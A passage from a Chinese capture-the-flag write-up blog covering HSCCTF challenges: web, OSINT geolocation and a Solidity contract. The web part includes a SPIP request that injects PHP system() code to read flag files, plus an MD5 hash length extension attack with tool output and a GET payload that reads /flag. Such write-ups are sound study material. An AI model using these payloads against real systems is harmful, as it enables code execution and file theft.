class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:25:&quot;&lt;?=system(&#x27;uniq /f*&#x27;); ?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><p>​</p><h3 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h3><blockquote><p>Hint: 同学发给我一个网址<a target="_blank" rel="noopener" href="https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。">https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。</a> 真的安全吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$secret</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;SECRETKEY&quot;</span>); <span class="comment"># For security reasons, the key length is greater than 8.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;applicant&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$_GET</span>[<span class="string">&quot;applicant&quot;</span>].<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file_contents</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;My tool is safe.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>哈希长度扩展攻击。</p><p>已知secret位数大于8，已知明文 <code>adminweb.log</code>，已知md5 hash=9c80d2bb0bccfefeb3750744c0760496，扩展字符 <code>/flag</code>。</p><p>利用脚本爆破secret位数，尝试到15的时候成功获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 hash_ext_attack.py                                                  </span><br><span class="line">2024-03-10 08:17:33.714 | DEBUG    | common.md5_manual:__init__:17 - init......</span><br><span class="line">请输入已知明文：adminweb.log</span><br><span class="line">请输入已知hash： 9c80d2bb0bccfefeb3750744c0760496</span><br><span class="line">请输入扩展字符: /flag</span><br><span class="line">请输入密钥长度：15</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:69 - 已知明文：b&#x27;adminweb.log&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:70 - 已知hash：b&#x27;9c80d2bb0bccfefeb3750744c0760496&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:72 - 新明文：b&#x27;adminweb.log\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x00\x00\x00\x00\x00\x00\x00/flag&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:73 - 新明文(url编码)：adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00%2Fflag</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:75 - 新hash:46879013726bfb7dff6921fd2e9ab2f8</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>GET /?md5=46879013726bfb7dff6921fd2e9ab2f8&amp;applicant=adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00&amp;filename=/flag</code></p><p>​</p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="NICE-RIVER"><a href="#NICE-RIVER" class="headerlink" title="NICE_RIVER"></a>NICE_RIVER</h3><p>百度识图，识别大桥为琶洲大桥，根据方位定位到保利天幕广场员工停车场：<code>HSCCTF&#123;23.10393,113.38363&#125;</code>。</p><p>​</p><h3 id="город"><a href="#город" class="headerlink" title="город"></a>город</h3><p>google识图，找到<a target="_blank" rel="noopener" href="https://wikimapia.org/4495454/Olonkho-shopping-centre">https://wikimapia.org/4495454/Olonkho-shopping-centre</a></p><p>定位为Olonkho shopping centre，定位点：<code>HSCCTF&#123;62.03716,129.73620&#125;</code></p><p>​</p><h3 id="CAR"><a href="#CAR" class="headerlink" title="CAR"></a>CAR</h3><p>截取楼的部分百度识图，识别出为渝州宾馆。</p><p>小红书里搜索渝州宾馆，看到一张清晰的图片，正对的是渝州宾馆黄山厅，左边是大堂。</p><p>结合百度和google卫星视图看，得到定位点：<code>HSCCTF&#123;29.53201,106.50045&#125;</code>。</p><p>​</p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>搜索关键词：圣彼得堡+广场+船锚，找到相关图片：<a target="_blank" rel="noopener" href="https://www.huitu.com/photo/show/20190424/162434930070.html。">https://www.huitu.com/photo/show/20190424/162434930070.html。</a></p><p>定位为圣彼得堡瓦西里岛古港口，定位点：<code>HSCCTF&#123;59.94387,30.30595&#125;</code>。</p><p>​</p><h3 id="CITY"><a href="#CITY" class="headerlink" title="CITY"></a>CITY</h3><p>百度识图，找到米漾米居酒店，地址：<code>HSCCTF&#123;山东省菏泽市牡丹区黄巢路7号&#125;</code>。</p><p>​</p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="BONUS"><a href="#BONUS" class="headerlink" title="BONUS"></a>BONUS</h3><blockquote><p><strong>年终奖</strong></p><p>坏消息：公司只给你发了一张超市的会员卡作为年终奖<br>好消息：余额有114514元<br>坏消息：只能用来购买一块钱的糖，一次只能买一个<br>好消息：余额只剩1元时可以获得名为flag的神秘大奖<br>兑奖地址：nc xx.xx.xx.xx xxxx</p><p>智能合约部署网络为Polygon Mumbai<br>地址为：0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//contract.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract VipCard &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function applyCard() public &#123;</span><br><span class="line">        balances[msg.sender] = 114514;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function topUp(uint _amount) public &#123;</span><br><span class="line">        balances[msg.sender] += _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyCandy() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;not sufficient funds&quot;);</span><br><span class="line">        balances[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>非预期，进入区块链浏览器PolygonScan查看地址0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a的<a target="_blank" rel="noopener" href="https://mumbai.polygonscan.com/address/0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a">交易记录</a>，输入输入已完成题目要求的选手的地址即可。</p><p>预期解应该是uint上溢出漏洞。</p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="GeekChallenge2024 第十五届极客大挑战"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2023/11/27/match-Geek-Challenge-2023/" title="Geek Challenge 2023"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>